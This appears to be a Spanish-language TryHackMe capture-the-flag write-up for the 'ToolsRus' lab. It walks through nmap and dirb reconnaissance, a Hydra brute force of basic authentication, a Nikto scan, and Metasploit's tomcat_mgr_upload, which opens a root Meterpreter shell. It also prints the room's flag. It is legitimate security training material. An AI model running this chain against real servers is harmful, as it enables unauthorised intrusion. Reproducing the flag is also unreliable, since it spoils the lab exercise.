---
title: "TryHackMe: ToolsRus"
category: "TryHackMe"
order: 18
tags: ["tryhackme", "tomcat", "metasploit", "nikto", "dirb"]
layout: layouts/writeup.njk
permalink: /writeups/thm-toolsrus.html
---

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.207.207
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
```

## Enumeración de directorios

```bash
dirb http://10.10.207.207 /usr/share/dirb/wordlists/common.txt
...
==> DIRECTORY: http://10.10.207.207/guidelines/
+ http://10.10.207.207/index.html (CODE:200|SIZE:168)
+ http://10.10.207.207/protected (CODE:401|SIZE:460)
+ http://10.10.207.207/server-status (CODE:403|SIZE:301)
```

- Directorio encontrado que empieza con "g": `guidelines`
- Nombre encontrado dentro del directorio: `bob`
- Directorio con autenticación básica: `protected`

## Fuerza bruta con Hydra

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt http-get://10.10.207.207/protected
...
[80][http-get] host: 10.10.207.207   login: bob   password: bubbles
```

## Escaneo con Nikto sobre Tomcat Manager

El puerto 1234 corre **Apache Tomcat/Coyote JSP engine 1.1**. Con las credenciales de `bob` se autentica contra el manager:

```bash
nikto -id bob:bubbles -h http://10.10.207.207:1234/manager/html
...
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
...
+ Scan terminated: 20 error(s) and 76 item(s) reported on remote host
```

5 archivos de documentación identificados por Nikto (Movable Type config, `localstart.asp`, etc).

Servidor: `Apache/2.4.18`. Versión de Apache-Coyote: `1.1`.

## Explotación con Metasploit

```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.94.49
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost tun0
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: root
```

El módulo `tomcat_mgr_upload` de Metasploit despliega un WAR malicioso a través del manager autenticado, obteniendo ejecución de código directamente como **root**.

## Flag

```bash
meterpreter > cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

## Lecciones aprendidas

- Un servicio Tomcat Manager expuesto con credenciales débiles es una vía directa a RCE vía `tomcat_mgr_upload`, sin necesidad de escalar privilegios por separado si el proceso corre como root.
- `dirb`/`gobuster` siguen siendo el primer paso para descubrir superficies de ataque adicionales fuera del sitio principal.
- Nikto es útil para identificar rutas de configuración expuestas una vez que se tienen credenciales válidas.
